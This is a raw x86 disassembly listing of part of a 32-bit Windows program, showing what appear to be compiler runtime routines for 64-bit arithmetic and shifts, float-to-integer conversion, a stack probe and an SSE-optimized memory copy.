  40ac2d:	1b 54 24 1c          	sbb    0x1c(%esp),%edx
  40ac31:	33 db                	xor    %ebx,%ebx
  40ac33:	2b 44 24 10          	sub    0x10(%esp),%eax
  40ac37:	1b 54 24 14          	sbb    0x14(%esp),%edx
  40ac3b:	4d                   	dec    %ebp
  40ac3c:	79 07                	jns    0x40ac45
  40ac3e:	f7 da                	neg    %edx
  40ac40:	f7 d8                	neg    %eax
  40ac42:	83 da 00             	sbb    $0x0,%edx
  40ac45:	8b ca                	mov    %edx,%ecx
  40ac47:	8b d3                	mov    %ebx,%edx
  40ac49:	8b d9                	mov    %ecx,%ebx
  40ac4b:	8b c8                	mov    %eax,%ecx
  40ac4d:	8b c6                	mov    %esi,%eax
  40ac4f:	4f                   	dec    %edi
  40ac50:	75 07                	jne    0x40ac59
  40ac52:	f7 da                	neg    %edx
  40ac54:	f7 d8                	neg    %eax
  40ac56:	83 da 00             	sbb    $0x0,%edx
  40ac59:	5d                   	pop    %ebp
  40ac5a:	5e                   	pop    %esi
  40ac5b:	5f                   	pop    %edi
  40ac5c:	c2 10 00             	ret    $0x10
  40ac5f:	cc                   	int3
  40ac60:	80 f9 40             	cmp    $0x40,%cl
  40ac63:	73 15                	jae    0x40ac7a
  40ac65:	80 f9 20             	cmp    $0x20,%cl
  40ac68:	73 06                	jae    0x40ac70
  40ac6a:	0f ad d0             	shrd   %cl,%edx,%eax
  40ac6d:	d3 ea                	shr    %cl,%edx
  40ac6f:	c3                   	ret
  40ac70:	8b c2                	mov    %edx,%eax
  40ac72:	33 d2                	xor    %edx,%edx
  40ac74:	80 e1 1f             	and    $0x1f,%cl
  40ac77:	d3 e8                	shr    %cl,%eax
  40ac79:	c3                   	ret
  40ac7a:	33 c0                	xor    %eax,%eax
  40ac7c:	33 d2                	xor    %edx,%edx
  40ac7e:	c3                   	ret
  40ac7f:	cc                   	int3
  40ac80:	80 f9 40             	cmp    $0x40,%cl
  40ac83:	73 15                	jae    0x40ac9a
  40ac85:	80 f9 20             	cmp    $0x20,%cl
  40ac88:	73 06                	jae    0x40ac90
  40ac8a:	0f a5 c2             	shld   %cl,%eax,%edx
  40ac8d:	d3 e0                	shl    %cl,%eax
  40ac8f:	c3                   	ret
  40ac90:	8b d0                	mov    %eax,%edx
  40ac92:	33 c0                	xor    %eax,%eax
  40ac94:	80 e1 1f             	and    $0x1f,%cl
  40ac97:	d3 e2                	shl    %cl,%edx
  40ac99:	c3                   	ret
  40ac9a:	33 c0                	xor    %eax,%eax
  40ac9c:	33 d2                	xor    %edx,%edx
  40ac9e:	c3                   	ret
  40ac9f:	cc                   	int3
  40aca0:	83 3d dc 3a 41 00 00 	cmpl   $0x0,0x413adc
  40aca7:	74 37                	je     0x40ace0
  40aca9:	55                   	push   %ebp
  40acaa:	8b ec                	mov    %esp,%ebp
  40acac:	83 ec 08             	sub    $0x8,%esp
  40acaf:	83 e4 f8             	and    $0xfffffff8,%esp
  40acb2:	dd 1c 24             	fstpl  (%esp)
  40acb5:	f2 0f 2c 04 24       	cvttsd2si (%esp),%eax
  40acba:	c9                   	leave
  40acbb:	c3                   	ret
  40acbc:	83 3d dc 3a 41 00 00 	cmpl   $0x0,0x413adc
  40acc3:	74 1b                	je     0x40ace0
  40acc5:	83 ec 04             	sub    $0x4,%esp
  40acc8:	d9 3c 24             	fnstcw (%esp)
  40accb:	58                   	pop    %eax
  40accc:	66 83 e0 7f          	and    $0x7f,%ax
  40acd0:	66 83 f8 7f          	cmp    $0x7f,%ax
  40acd4:	74 d3                	je     0x40aca9
  40acd6:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
  40acdd:	8d 49 00             	lea    0x0(%ecx),%ecx
  40ace0:	55                   	push   %ebp
  40ace1:	8b ec                	mov    %esp,%ebp
  40ace3:	83 ec 20             	sub    $0x20,%esp
  40ace6:	83 e4 f0             	and    $0xfffffff0,%esp
  40ace9:	d9 c0                	fld    %st(0)
  40aceb:	d9 54 24 18          	fsts   0x18(%esp)
  40acef:	df 7c 24 10          	fistpll 0x10(%esp)
  40acf3:	df 6c 24 10          	fildll 0x10(%esp)
  40acf7:	8b 54 24 18          	mov    0x18(%esp),%edx
  40acfb:	8b 44 24 10          	mov    0x10(%esp),%eax
  40acff:	85 c0                	test   %eax,%eax
  40ad01:	74 3c                	je     0x40ad3f
  40ad03:	de e9                	fsubrp %st,%st(1)
  40ad05:	85 d2                	test   %edx,%edx
  40ad07:	79 1e                	jns    0x40ad27
  40ad09:	d9 1c 24             	fstps  (%esp)
  40ad0c:	8b 0c 24             	mov    (%esp),%ecx
  40ad0f:	81 f1 00 00 00 80    	xor    $0x80000000,%ecx
  40ad15:	81 c1 ff ff ff 7f    	add    $0x7fffffff,%ecx
  40ad1b:	83 d0 00             	adc    $0x0,%eax
  40ad1e:	8b 54 24 14          	mov    0x14(%esp),%edx
  40ad22:	83 d2 00             	adc    $0x0,%edx
  40ad25:	eb 2c                	jmp    0x40ad53
  40ad27:	d9 1c 24             	fstps  (%esp)
  40ad2a:	8b 0c 24             	mov    (%esp),%ecx
  40ad2d:	81 c1 ff ff ff 7f    	add    $0x7fffffff,%ecx
  40ad33:	83 d8 00             	sbb    $0x0,%eax
  40ad36:	8b 54 24 14          	mov    0x14(%esp),%edx
  40ad3a:	83 da 00             	sbb    $0x0,%edx
  40ad3d:	eb 14                	jmp    0x40ad53
  40ad3f:	8b 54 24 14          	mov    0x14(%esp),%edx
  40ad43:	f7 c2 ff ff ff 7f    	test   $0x7fffffff,%edx
  40ad49:	75 b8                	jne    0x40ad03
  40ad4b:	d9 5c 24 18          	fstps  0x18(%esp)
  40ad4f:	d9 5c 24 18          	fstps  0x18(%esp)
  40ad53:	c9                   	leave
  40ad54:	c3                   	ret
  40ad55:	cc                   	int3
  40ad56:	cc                   	int3
  40ad57:	cc                   	int3
  40ad58:	cc                   	int3
  40ad59:	cc                   	int3
  40ad5a:	cc                   	int3
  40ad5b:	cc                   	int3
  40ad5c:	cc                   	int3
  40ad5d:	cc                   	int3
  40ad5e:	cc                   	int3
  40ad5f:	cc                   	int3
  40ad60:	51                   	push   %ecx
  40ad61:	8d 4c 24 04          	lea    0x4(%esp),%ecx
  40ad65:	2b c8                	sub    %eax,%ecx
  40ad67:	1b c0                	sbb    %eax,%eax
  40ad69:	f7 d0                	not    %eax
  40ad6b:	23 c8                	and    %eax,%ecx
  40ad6d:	8b c4                	mov    %esp,%eax
  40ad6f:	25 00 f0 ff ff       	and    $0xfffff000,%eax
  40ad74:	3b c8                	cmp    %eax,%ecx
  40ad76:	f2 72 0b             	bnd jb 0x40ad84
  40ad79:	8b c1                	mov    %ecx,%eax
  40ad7b:	59                   	pop    %ecx
  40ad7c:	94                   	xchg   %eax,%esp
  40ad7d:	8b 00                	mov    (%eax),%eax
  40ad7f:	89 04 24             	mov    %eax,(%esp)
  40ad82:	f2 c3                	bnd ret
  40ad84:	2d 00 10 00 00       	sub    $0x1000,%eax
  40ad89:	85 00                	test   %eax,(%eax)
  40ad8b:	eb e7                	jmp    0x40ad74
  40ad8d:	cc                   	int3
  40ad8e:	cc                   	int3
  40ad8f:	cc                   	int3
  40ad90:	57                   	push   %edi
  40ad91:	56                   	push   %esi
  40ad92:	8b 74 24 10          	mov    0x10(%esp),%esi
  40ad96:	8b 4c 24 14          	mov    0x14(%esp),%ecx
  40ad9a:	8b 7c 24 0c          	mov    0xc(%esp),%edi
  40ad9e:	8b c1                	mov    %ecx,%eax
  40ada0:	8b d1                	mov    %ecx,%edx
  40ada2:	03 c6                	add    %esi,%eax
  40ada4:	3b fe                	cmp    %esi,%edi
  40ada6:	76 08                	jbe    0x40adb0
  40ada8:	3b f8                	cmp    %eax,%edi
  40adaa:	0f 82 94 02 00 00    	jb     0x40b044
  40adb0:	83 f9 20             	cmp    $0x20,%ecx
  40adb3:	0f 82 d2 04 00 00    	jb     0x40b28b
  40adb9:	81 f9 80 00 00 00    	cmp    $0x80,%ecx
  40adbf:	73 13                	jae    0x40add4
  40adc1:	0f ba 25 10 30 41 00 	btl    $0x1,0x413010
  40adc8:	01 
  40adc9:	0f 82 8e 04 00 00    	jb     0x40b25d
  40adcf:	e9 e3 01 00 00       	jmp    0x40afb7
  40add4:	0f ba 25 e0 3a 41 00 	btl    $0x1,0x413ae0
  40addb:	01 
  40addc:	73 09                	jae    0x40ade7
  40adde:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  40ade0:	8b 44 24 0c          	mov    0xc(%esp),%eax
  40ade4:	5e                   	pop    %esi
  40ade5:	5f                   	pop    %edi
  40ade6:	c3                   	ret
  40ade7:	8b c7                	mov    %edi,%eax
  40ade9:	33 c6                	xor    %esi,%eax
  40adeb:	a9 0f 00 00 00       	test   $0xf,%eax
  40adf0:	75 0e                	jne    0x40ae00
  40adf2:	0f ba 25 10 30 41 00 	btl    $0x1,0x413010
  40adf9:	01 
  40adfa:	0f 82 e0 03 00 00    	jb     0x40b1e0
  40ae00:	0f ba 25 e0 3a 41 00 	btl    $0x0,0x413ae0
  40ae07:	00 
  40ae08:	0f 83 a9 01 00 00    	jae    0x40afb7
  40ae0e:	f7 c7 03 00 00 00    	test   $0x3,%edi
  40ae14:	0f 85 9d 01 00 00    	jne    0x40afb7
  40ae1a:	f7 c6 03 00 00 00    	test   $0x3,%esi
  40ae20:	0f 85 ac 01 00 00    	jne    0x40afd2
  40ae26:	0f ba e7 02          	bt     $0x2,%edi
  40ae2a:	73 0d                	jae    0x40ae39
  40ae2c:	8b 06                	mov    (%esi),%eax
  40ae2e:	83 e9 04             	sub    $0x4,%ecx
  40ae31:	8d 76 04             	lea    0x4(%esi),%esi
  40ae34:	89 07                	mov    %eax,(%edi)
  40ae36:	8d 7f 04             	lea    0x4(%edi),%edi
  40ae39:	0f ba e7 03          	bt     $0x3,%edi
  40ae3d:	73 11                	jae    0x40ae50
  40ae3f:	f3 0f 7e 0e          	movq   (%esi),%xmm1
  40ae43:	83 e9 08             	sub    $0x8,%ecx
  40ae46:	8d 76 08             	lea    0x8(%esi),%esi
  40ae49:	66 0f d6 0f          	movq   %xmm1,(%edi)
  40ae4d:	8d 7f 08             	lea    0x8(%edi),%edi
  40ae50:	f7 c6 07 00 00 00    	test   $0x7,%esi
  40ae56:	74 65                	je     0x40aebd
  40ae58:	0f ba e6 03          	bt     $0x3,%esi
  40ae5c:	0f 83 b4 00 00 00    	jae    0x40af16
  40ae62:	66 0f 6f 4e f4       	movdqa -0xc(%esi),%xmm1
  40ae67:	8d 76 f4             	lea    -0xc(%esi),%esi
  40ae6a:	8b ff                	mov    %edi,%edi
  40ae6c:	66 0f 6f 5e 10       	movdqa 0x10(%esi),%xmm3
  40ae71:	83 e9 30             	sub    $0x30,%ecx
  40ae74:	66 0f 6f 46 20       	movdqa 0x20(%esi),%xmm0
  40ae79:	66 0f 6f 6e 30       	movdqa 0x30(%esi),%xmm5
  40ae7e:	8d 76 30             	lea    0x30(%esi),%esi
  40ae81:	83 f9 30             	cmp    $0x30,%ecx
  40ae84:	66 0f 6f d3          	movdqa %xmm3,%xmm2
  40ae88:	66 0f 3a 0f d9 0c    	palignr $0xc,%xmm1,%xmm3
  40ae8e:	66 0f 7f 1f          	movdqa %xmm3,(%edi)
  40ae92:	66 0f 6f e0          	movdqa %xmm0,%xmm4
  40ae96:	66 0f 3a 0f c2 0c    	palignr $0xc,%xmm2,%xmm0
  40ae9c:	66 0f 7f 47 10       	movdqa %xmm0,0x10(%edi)
  40aea1:	66 0f 6f cd          	movdqa %xmm5,%xmm1
  40aea5:	66 0f 3a 0f ec 0c    	palignr $0xc,%xmm4,%xmm5
  40aeab:	66 0f 7f 6f 20       	movdqa %xmm5,0x20(%edi)
  40aeb0:	8d 7f 30             	lea    0x30(%edi),%edi
  40aeb3:	7d b7                	jge    0x40ae6c
  40aeb5:	8d 76 0c             	lea    0xc(%esi),%esi
  40aeb8:	e9 af 00 00 00       	jmp    0x40af6c
  40aebd:	66 0f 6f 4e f8       	movdqa -0x8(%esi),%xmm1
  40aec2:	8d 76 f8             	lea    -0x8(%esi),%esi
  40aec5:	8d 49 00             	lea    0x0(%ecx),%ecx
  40aec8:	66 0f 6f 5e 10       	movdqa 0x10(%esi),%xmm3
  40aecd:	83 e9 30             	sub    $0x30,%ecx
  40aed0:	66 0f 6f 46 20       	movdqa 0x20(%esi),%xmm0
  40aed5:	66 0f 6f 6e 30       	movdqa 0x30(%esi),%xmm5
  40aeda:	8d 76 30             	lea    0x30(%esi),%esi
  40aedd:	83 f9 30             	cmp    $0x30,%ecx
  40aee0:	66 0f 6f d3          	movdqa %xmm3,%xmm2
  40aee4:	66 0f 3a 0f d9 08    	palignr $0x8,%xmm1,%xmm3
  40aeea:	66 0f 7f 1f          	movdqa %xmm3,(%edi)
  40aeee:	66 0f 6f e0          	movdqa %xmm0,%xmm4
  40aef2:	66 0f 3a 0f c2 08    	palignr $0x8,%xmm2,%xmm0
  40aef8:	66 0f 7f 47 10       	movdqa %xmm0,0x10(%edi)
  40aefd:	66 0f 6f cd          	movdqa %xmm5,%xmm1
  40af01:	66 0f 3a 0f ec 08    	palignr $0x8,%xmm4,%xmm5
  40af07:	66 0f 7f 6f 20       	movdqa %xmm5,0x20(%edi)
  40af0c:	8d 7f 30             	lea    0x30(%edi),%edi
  40af0f:	7d b7                	jge    0x40aec8
  40af11:	8d 76 08             	lea    0x8(%esi),%esi
  40af14:	eb 56                	jmp    0x40af6c
  40af16:	66 0f 6f 4e fc       	movdqa -0x4(%esi),%xmm1
  40af1b:	8d 76 fc             	lea    -0x4(%esi),%esi
  40af1e:	8b ff                	mov    %edi,%edi
  40af20:	66 0f 6f 5e 10       	movdqa 0x10(%esi),%xmm3
  40af25:	83 e9 30             	sub    $0x30,%ecx
  40af28:	66 0f 6f 46 20       	movdqa 0x20(%esi),%xmm0
  40af2d:	66 0f 6f 6e 30       	movdqa 0x30(%esi),%xmm5
  40af32:	8d 76 30             	lea    0x30(%esi),%esi
  40af35:	83 f9 30             	cmp    $0x30,%ecx
  40af38:	66 0f 6f d3          	movdqa %xmm3,%xmm2
  40af3c:	66 0f 3a 0f d9 04    	palignr $0x4,%xmm1,%xmm3
  40af42:	66 0f 7f 1f          	movdqa %xmm3,(%edi)
  40af46:	66 0f 6f e0          	movdqa %xmm0,%xmm4
  40af4a:	66 0f 3a 0f c2 04    	palignr $0x4,%xmm2,%xmm0
  40af50:	66 0f 7f 47 10       	movdqa %xmm0,0x10(%edi)
  40af55:	66 0f 6f cd          	movdqa %xmm5,%xmm1
  40af59:	66 0f 3a 0f ec 04    	palignr $0x4,%xmm4,%xmm5
  40af5f:	66 0f 7f 6f 20       	movdqa %xmm5,0x20(%edi)
  40af64:	8d 7f 30             	lea    0x30(%edi),%edi
  40af67:	7d b7                	jge    0x40af20
  40af69:	8d 76 04             	lea    0x4(%esi),%esi
  40af6c:	83 f9 10             	cmp    $0x10,%ecx
  40af6f:	7c 13                	jl     0x40af84
  40af71:	f3 0f 6f 0e          	movdqu (%esi),%xmm1
  40af75:	83 e9 10             	sub    $0x10,%ecx
  40af78:	8d 76 10             	lea    0x10(%esi),%esi
  40af7b:	66 0f 7f 0f          	movdqa %xmm1,(%edi)
  40af7f:	8d 7f 10             	lea    0x10(%edi),%edi
  40af82:	eb e8                	jmp    0x40af6c
  40af84:	0f ba e1 02          	bt     $0x2,%ecx
  40af88:	73 0d                	jae    0x40af97
  40af8a:	8b 06                	mov    (%esi),%eax
  40af8c:	83 e9 04             	sub    $0x4,%ecx
  40af8f:	8d 76 04             	lea    0x4(%esi),%esi
  40af92:	89 07                	mov    %eax,(%edi)
  40af94:	8d 7f 04             	lea    0x4(%edi),%edi
  40af97:	0f ba e1 03          	bt     $0x3,%ecx
  40af9b:	73 11                	jae    0x40afae
  40af9d:	f3 0f 7e 0e          	movq   (%esi),%xmm1
  40afa1:	83 e9 08             	sub    $0x8,%ecx
  40afa4:	8d 76 08             	lea    0x8(%esi),%esi
  40afa7:	66 0f d6 0f          	movq   %xmm1,(%edi)
  40afab:	8d 7f 08             	lea    0x8(%edi),%edi
  40afae:	8b 04 8d f4 af 40 00 	mov    0x40aff4(,%ecx,4),%eax
  40afb5:	ff e0                	jmp    *%eax
  40afb7:	f7 c7 03 00 00 00    	test   $0x3,%edi
  40afbd:	74 13                	je     0x40afd2
  40afbf:	8a 06                	mov    (%esi),%al
  40afc1:	88 07                	mov    %al,(%edi)
  40afc3:	49                   	dec    %ecx
  40afc4:	83 c6 01             	add    $0x1,%esi
  40afc7:	83 c7 01             	add    $0x1,%edi
  40afca:	f7 c7 03 00 00 00    	test   $0x3,%edi
  40afd0:	75 ed                	jne    0x40afbf
  40afd2:	8b d1                	mov    %ecx,%edx
  40afd4:	83 f9 20             	cmp    $0x20,%ecx
  40afd7:	0f 82 ae 02 00 00    	jb     0x40b28b
  40afdd:	c1 e9 02             	shr    $0x2,%ecx
  40afe0:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  40afe2:	83 e2 03             	and    $0x3,%edx
  40afe5:	ff 24 95 f4 af 40 00 	jmp    *0x40aff4(,%edx,4)
  40afec:	ff 24 8d 04 b0 40 00 	jmp    *0x40b004(,%ecx,4)
  40aff3:	90                   	nop
  40aff4:	04 b0                	add    $0xb0,%al
  40aff6:	40                   	inc    %eax
  40aff7:	00 0c b0             	add    %cl,(%eax,%esi,4)
  40affa:	40                   	inc    %eax
  40affb:	00 18                	add    %bl,(%eax)
  40affd:	b0 40                	mov    $0x40,%al
  40afff:	00 2c b0             	add    %ch,(%eax,%esi,4)
  40b002:	40                   	inc    %eax
  40b003:	00 8b 44 24 0c 5e    	add    %cl,0x5e0c2444(%ebx)
  40b009:	5f                   	pop    %edi
  40b00a:	c3                   	ret
  40b00b:	90                   	nop
  40b00c:	8a 06                	mov    (%esi),%al
  40b00e:	88 07                	mov    %al,(%edi)
  40b010:	8b 44 24 0c          	mov    0xc(%esp),%eax
  40b014:	5e                   	pop    %esi
  40b015:	5f                   	pop    %edi
  40b016:	c3                   	ret
  40b017:	90                   	nop
  40b018:	8a 06                	mov    (%esi),%al
  40b01a:	88 07                	mov    %al,(%edi)
  40b01c:	8a 46 01             	mov    0x1(%esi),%al
  40b01f:	88 47 01             	mov    %al,0x1(%edi)
  40b022:	8b 44 24 0c          	mov    0xc(%esp),%eax
  40b026:	5e                   	pop    %esi
  40b027:	5f                   	pop    %edi
  40b028:	c3                   	ret
  40b029:	8d 49 00             	lea    0x0(%ecx),%ecx
  40b02c:	8a 06                	mov    (%esi),%al
  40b02e:	88 07                	mov    %al,(%edi)
  40b030:	8a 46 01             	mov    0x1(%esi),%al
  40b033:	88 47 01             	mov    %al,0x1(%edi)
  40b036:	8a 46 02             	mov    0x2(%esi),%al
  40b039:	88 47 02             	mov    %al,0x2(%edi)
  40b03c:	8b 44 24 0c          	mov    0xc(%esp),%eax
  40b040:	5e                   	pop    %esi
  40b041:	5f                   	pop    %edi
  40b042:	c3                   	ret
  40b043:	90                   	nop
  40b044:	8d 34 31             	lea    (%ecx,%esi,1),%esi
  40b047:	8d 3c 39             	lea    (%ecx,%edi,1),%edi
  40b04a:	83 f9 20             	cmp    $0x20,%ecx
  40b04d:	0f 82 51 01 00 00    	jb     0x40b1a4
  40b053:	0f ba 25 10 30 41 00 	btl    $0x1,0x413010
  40b05a:	01 
  40b05b:	0f 82 94 00 00 00    	jb     0x40b0f5
  40b061:	f7 c7 03 00 00 00    	test   $0x3,%edi
  40b067:	74 14                	je     0x40b07d
  40b069:	8b d7                	mov    %edi,%edx
  40b06b:	83 e2 03             	and    $0x3,%edx
  40b06e:	2b ca                	sub    %edx,%ecx
  40b070:	8a 46 ff             	mov    -0x1(%esi),%al
  40b073:	88 47 ff             	mov    %al,-0x1(%edi)
  40b076:	4e                   	dec    %esi
  40b077:	4f                   	dec    %edi
  40b078:	83 ea 01             	sub    $0x1,%edx
  40b07b:	75 f3                	jne    0x40b070
  40b07d:	83 f9 20             	cmp    $0x20,%ecx
  40b080:	0f 82 1e 01 00 00    	jb     0x40b1a4
  40b086:	8b d1                	mov    %ecx,%edx
  40b088:	c1 e9 02             	shr    $0x2,%ecx
  40b08b:	83 e2 03             	and    $0x3,%edx
  40b08e:	83 ee 04             	sub    $0x4,%esi
  40b091:	83 ef 04             	sub    $0x4,%edi
  40b094:	fd                   	std
  40b095:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  40b097:	fc                   	cld
  40b098:	ff 24 95 a0 b0 40 00 	jmp    *0x40b0a0(,%edx,4)
  40b09f:	90                   	nop
  40b0a0:	b0 b0                	mov    $0xb0,%al
  40b0a2:	40                   	inc    %eax
  40b0a3:	00 b8 b0 40 00 c8    	add    %bh,-0x37ffbf50(%eax)
  40b0a9:	b0 40                	mov    $0x40,%al
  40b0ab:	00 dc                	add    %bl,%ah
  40b0ad:	b0 40                	mov    $0x40,%al
  40b0af:	00 8b 44 24 0c 5e    	add    %cl,0x5e0c2444(%ebx)
  40b0b5:	5f                   	pop    %edi
  40b0b6:	c3                   	ret
  40b0b7:	90                   	nop
  40b0b8:	8a 46 03             	mov    0x3(%esi),%al
  40b0bb:	88 47 03             	mov    %al,0x3(%edi)
  40b0be:	8b 44 24 0c          	mov    0xc(%esp),%eax
  40b0c2:	5e                   	pop    %esi
  40b0c3:	5f                   	pop    %edi
  40b0c4:	c3                   	ret
  40b0c5:	8d 49 00             	lea    0x0(%ecx),%ecx
  40b0c8:	8a 46 03             	mov    0x3(%esi),%al
  40b0cb:	88 47 03             	mov    %al,0x3(%edi)
  40b0ce:	8a 46 02             	mov    0x2(%esi),%al
  40b0d1:	88 47 02             	mov    %al,0x2(%edi)
  40b0d4:	8b 44 24 0c          	mov    0xc(%esp),%eax
  40b0d8:	5e                   	pop    %esi
  40b0d9:	5f                   	pop    %edi
  40b0da:	c3                   	ret
  40b0db:	90                   	nop
  40b0dc:	8a 46 03             	mov    0x3(%esi),%al
  40b0df:	88 47 03             	mov    %al,0x3(%edi)
  40b0e2:	8a 46 02             	mov    0x2(%esi),%al
  40b0e5:	88 47 02             	mov    %al,0x2(%edi)
  40b0e8:	8a 46 01             	mov    0x1(%esi),%al
  40b0eb:	88 47 01             	mov    %al,0x1(%edi)
  40b0ee:	8b 44 24 0c          	mov    0xc(%esp),%eax
  40b0f2:	5e                   	pop    %esi
  40b0f3:	5f                   	pop    %edi
  40b0f4:	c3                   	ret
  40b0f5:	f7 c7 0f 00 00 00    	test   $0xf,%edi
  40b0fb:	74 0f                	je     0x40b10c
  40b0fd:	49                   	dec    %ecx
  40b0fe:	4e                   	dec    %esi
  40b0ff:	4f                   	dec    %edi
  40b100:	8a 06                	mov    (%esi),%al
  40b102:	88 07                	mov    %al,(%edi)
  40b104:	f7 c7 0f 00 00 00    	test   $0xf,%edi
  40b10a:	75 f1                	jne    0x40b0fd
  40b10c:	81 f9 80 00 00 00    	cmp    $0x80,%ecx
  40b112:	72 68                	jb     0x40b17c
  40b114:	81 ee 80 00 00 00    	sub    $0x80,%esi
  40b11a:	81 ef 80 00 00 00    	sub    $0x80,%edi
  40b120:	f3 0f 6f 06          	movdqu (%esi),%xmm0
  40b124:	f3 0f 6f 4e 10       	movdqu 0x10(%esi),%xmm1
  40b129:	f3 0f 6f 56 20       	movdqu 0x20(%esi),%xmm2
  40b12e:	f3 0f 6f 5e 30       	movdqu 0x30(%esi),%xmm3
  40b133:	f3 0f 6f 66 40       	movdqu 0x40(%esi),%xmm4
  40b138:	f3 0f 6f 6e 50       	movdqu 0x50(%esi),%xmm5
  40b13d:	f3 0f 6f 76 60       	movdqu 0x60(%esi),%xmm6
  40b142:	f3 0f 6f 7e 70       	movdqu 0x70(%esi),%xmm7
  40b147:	f3 0f 7f 07          	movdqu %xmm0,(%edi)
  40b14b:	f3 0f 7f 4f 10       	movdqu %xmm1,0x10(%edi)
  40b150:	f3 0f 7f 57 20       	movdqu %xmm2,0x20(%edi)
  40b155:	f3 0f 7f 5f 30       	movdqu %xmm3,0x30(%edi)
  40b15a:	f3 0f 7f 67 40       	movdqu %xmm4,0x40(%edi)
  40b15f:	f3 0f 7f 6f 50       	movdqu %xmm5,0x50(%edi)
  40b164:	f3 0f 7f 77 60       	movdqu %xmm6,0x60(%edi)
  40b169:	f3 0f 7f 7f 70       	movdqu %xmm7,0x70(%edi)
  40b16e:	81 e9 80 00 00 00    	sub    $0x80,%ecx
  40b174:	f7 c1 80 ff ff ff    	test   $0xffffff80,%ecx
  40b17a:	75 90                	jne    0x40b10c
  40b17c:	83 f9 20             	cmp    $0x20,%ecx
  40b17f:	72 23                	jb     0x40b1a4
  40b181:	83 ee 20             	sub    $0x20,%esi
  40b184:	83 ef 20             	sub    $0x20,%edi
  40b187:	f3 0f 6f 06          	movdqu (%esi),%xmm0
  40b18b:	f3 0f 6f 4e 10       	movdqu 0x10(%esi),%xmm1
  40b190:	f3 0f 7f 07          	movdqu %xmm0,(%edi)
  40b194:	f3 0f 7f 4f 10       	movdqu %xmm1,0x10(%edi)
  40b199:	83 e9 20             	sub    $0x20,%ecx
  40b19c:	f7 c1 e0 ff ff ff    	test   $0xffffffe0,%ecx
  40b1a2:	75 dd                	jne    0x40b181
  40b1a4:	f7 c1 fc ff ff ff    	test   $0xfffffffc,%ecx
  40b1aa:	74 15                	je     0x40b1c1
  40b1ac:	83 ef 04             	sub    $0x4,%edi
  40b1af:	83 ee 04             	sub    $0x4,%esi
  40b1b2:	8b 06                	mov    (%esi),%eax
  40b1b4:	89 07                	mov    %eax,(%edi)
  40b1b6:	83 e9 04             	sub    $0x4,%ecx
  40b1b9:	f7 c1 fc ff ff ff    	test   $0xfffffffc,%ecx
  40b1bf:	75 eb                	jne    0x40b1ac
  40b1c1:	85 c9                	test   %ecx,%ecx
  40b1c3:	74 0f                	je     0x40b1d4
  40b1c5:	83 ef 01             	sub    $0x1,%edi
  40b1c8:	83 ee 01             	sub    $0x1,%esi
  40b1cb:	8a 06                	mov    (%esi),%al
  40b1cd:	88 07                	mov    %al,(%edi)
  40b1cf:	83 e9 01             	sub    $0x1,%ecx
  40b1d2:	75 f1                	jne    0x40b1c5
  40b1d4:	8b 44 24 0c          	mov    0xc(%esp),%eax
  40b1d8:	5e                   	pop    %esi
  40b1d9:	5f                   	pop    %edi
  40b1da:	c3                   	ret
  40b1db:	eb 03                	jmp    0x40b1e0
  40b1dd:	cc                   	int3
  40b1de:	cc                   	int3
  40b1df:	cc                   	int3
  40b1e0:	8b c6                	mov    %esi,%eax
  40b1e2:	83 e0 0f             	and    $0xf,%eax
  40b1e5:	85 c0                	test   %eax,%eax
  40b1e7:	0f 85 e3 00 00 00    	jne    0x40b2d0
  40b1ed:	8b d1                	mov    %ecx,%edx
  40b1ef:	83 e1 7f             	and    $0x7f,%ecx
  40b1f2:	c1 ea 07             	shr    $0x7,%edx
  40b1f5:	74 66                	je     0x40b25d
  40b1f7:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
  40b1fe:	8b ff                	mov    %edi,%edi
  40b200:	66 0f 6f 06          	movdqa (%esi),%xmm0
  40b204:	66 0f 6f 4e 10       	movdqa 0x10(%esi),%xmm1
  40b209:	66 0f 6f 56 20       	movdqa 0x20(%esi),%xmm2
  40b20e:	66 0f 6f 5e 30       	movdqa 0x30(%esi),%xmm3
  40b213:	66 0f 7f 07          	movdqa %xmm0,(%edi)
  40b217:	66 0f 7f 4f 10       	movdqa %xmm1,0x10(%edi)
  40b21c:	66 0f 7f 57 20       	movdqa %xmm2,0x20(%edi)
  40b221:	66 0f 7f 5f 30       	movdqa %xmm3,0x30(%edi)
  40b226:	66 0f 6f 66 40       	movdqa 0x40(%esi),%xmm4
  40b22b:	66 0f 6f 6e 50       	movdqa 0x50(%esi),%xmm5
  40b230:	66 0f 6f 76 60       	movdqa 0x60(%esi),%xmm6
  40b235:	66 0f 6f 7e 70       	movdqa 0x70(%esi),%xmm7
  40b23a:	66 0f 7f 67 40       	movdqa %xmm4,0x40(%edi)
  40b23f:	66 0f 7f 6f 50       	movdqa %xmm5,0x50(%edi)
  40b244:	66 0f 7f 77 60       	movdqa %xmm6,0x60(%edi)
  40b249:	66 0f 7f 7f 70       	movdqa %xmm7,0x70(%edi)
  40b24e:	8d b6 80 00 00 00    	lea    0x80(%esi),%esi
  40b254:	8d bf 80 00 00 00    	lea    0x80(%edi),%edi
  40b25a:	4a                   	dec    %edx
  40b25b:	75 a3                	jne    0x40b200
  40b25d:	85 c9                	test   %ecx,%ecx
  40b25f:	74 5f                	je     0x40b2c0
  40b261:	8b d1                	mov    %ecx,%edx
  40b263:	c1 ea 05             	shr    $0x5,%edx
  40b266:	85 d2                	test   %edx,%edx
  40b268:	74 21                	je     0x40b28b
  40b26a:	8d 9b 00 00 00 00    	lea    0x0(%ebx),%ebx
  40b270:	f3 0f 6f 06          	movdqu (%esi),%xmm0
  40b274:	f3 0f 6f 4e 10       	movdqu 0x10(%esi),%xmm1
  40b279:	f3 0f 7f 07          	movdqu %xmm0,(%edi)
  40b27d:	f3 0f 7f 4f 10       	movdqu %xmm1,0x10(%edi)
  40b282:	8d 76 20             	lea    0x20(%esi),%esi
  40b285:	8d 7f 20             	lea    0x20(%edi),%edi
  40b288:	4a                   	dec    %edx
  40b289:	75 e5                	jne    0x40b270
  40b28b:	83 e1 1f             	and    $0x1f,%ecx
  40b28e:	74 30                	je     0x40b2c0
  40b290:	8b c1                	mov    %ecx,%eax
  40b292:	c1 e9 02             	shr    $0x2,%ecx
  40b295:	74 0f                	je     0x40b2a6
  40b297:	8b 16                	mov    (%esi),%edx
  40b299:	89 17                	mov    %edx,(%edi)
  40b29b:	83 c7 04             	add    $0x4,%edi
